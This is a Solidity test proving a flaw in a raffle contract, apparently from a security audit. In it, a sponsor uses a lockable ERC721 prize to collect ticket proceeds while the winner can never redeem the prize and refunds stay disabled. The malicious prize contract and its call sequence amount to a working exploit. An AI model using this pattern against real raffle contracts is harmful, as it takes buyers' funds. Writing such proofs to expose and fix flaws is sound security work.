// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;
import {RaffleFactory} from "../src/RaffleFactory.sol";
import {Raffle} from "../src/Raffle.sol";
import {IRaffle} from "../src/interfaces/IRaffle.sol";
import {IRaffleFactory} from "../src/interfaces/IRaffleFactory.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
interface Vm { function prank(address) external; function warp(uint256) external; function deal(address,uint256) external; function expectRevert() external; }
contract Quote {
 mapping(address=>uint256) public balanceOf;
 mapping(address=>mapping(address=>uint256)) public allowance;
 function decimals() external pure returns(uint8){return 6;}
 function mint(address to,uint256 n) external {balanceOf[to]+=n;}
 function approve(address to,uint256 n) external returns(bool){allowance[msg.sender][to]=n;return true;}
 function transfer(address to,uint256 n) external returns(bool){balanceOf[msg.sender]-=n;balanceOf[to]+=n;return true;}
 function transferFrom(address from,address to,uint256 n) external returns(bool){allowance[from][msg.sender]-=n;balanceOf[from]-=n;balanceOf[to]+=n;return true;}
}
contract Wrapper {
 address public consumer;
 function link() external pure returns(address){return address(0x100);}
 function calculateRequestPriceNative(uint32,uint32) external pure returns(uint256){return 0.01 ether;}
 function estimateRequestPriceNative(uint32,uint32,uint256) external pure returns(uint256){return 0.01 ether;}
 function requestRandomWordsInNative(uint32,uint16,uint32,bytes calldata) external payable returns(uint256){require(msg.value==0.01 ether);consumer=msg.sender;return 1;}
 function fulfill() external {uint256[] memory words=new uint256[](1);Raffle(payable(consumer)).rawFulfillRandomWords(1,words);}
}
contract Prize is ERC721 {
 address public immutable issuer;
 bool public locked;
 constructor(address holder) ERC721("Prize","P"){issuer=holder;_mint(holder,1);}
 function lock() external {require(msg.sender==issuer);locked=true;}
 function transferFrom(address from,address to,uint256 id) public override {require(!locked,"prize locked");super.transferFrom(from,to,id);}
}
contract PrizeBoundaryProof {
 Vm constant vm=Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
 function testSponsorGets95USDCWhilePrizeDeliveryReverts() external {
  address sponsor=address(0xA11CE);address buyer=address(0xB0B);address treasury=address(0xCAFE);
  vm.warp(1000);
  Quote quote=new Quote();Wrapper wrapper=new Wrapper();Prize prize=new Prize(sponsor);
  RaffleFactory factory=new RaffleFactory(address(quote),address(wrapper),treasury);
  vm.prank(sponsor);prize.approve(address(factory),1);
  vm.prank(sponsor);address raffleAddress=factory.createRaffle(IRaffleFactory.CreateRaffleParams(sponsor,address(prize),1,100,1100));
  Raffle raffle=Raffle(payable(raffleAddress));
  quote.mint(buyer,100e6);vm.prank(buyer);quote.approve(raffleAddress,100e6);
  vm.prank(buyer);raffle.buyEntries(buyer,100);
  vm.prank(sponsor);prize.lock();
  vm.warp(1100);vm.deal(address(this),1 ether);raffle.requestDraw{value:0.01 ether}();wrapper.fulfill();
  require(raffle.status()==IRaffle.Status.NftWon);
  raffle.settleWinningTicket(1);raffle.releaseSponsorProceeds();raffle.releaseProtocolFees();
  require(quote.balanceOf(sponsor)==95e6);require(quote.balanceOf(treasury)==5e6);
  require(quote.balanceOf(raffleAddress)==0);require(prize.ownerOf(1)==raffleAddress);
  vm.expectRevert();vm.prank(buyer);raffle.redeemWinningTicket(1);
  require(raffle.ownerOf(1)==buyer);require(!raffle.winnerRedeemed());require(!raffle.prizeClaimed());
  vm.warp(1_000_000);vm.expectRevert();raffle.enableRefunds();
 }
}
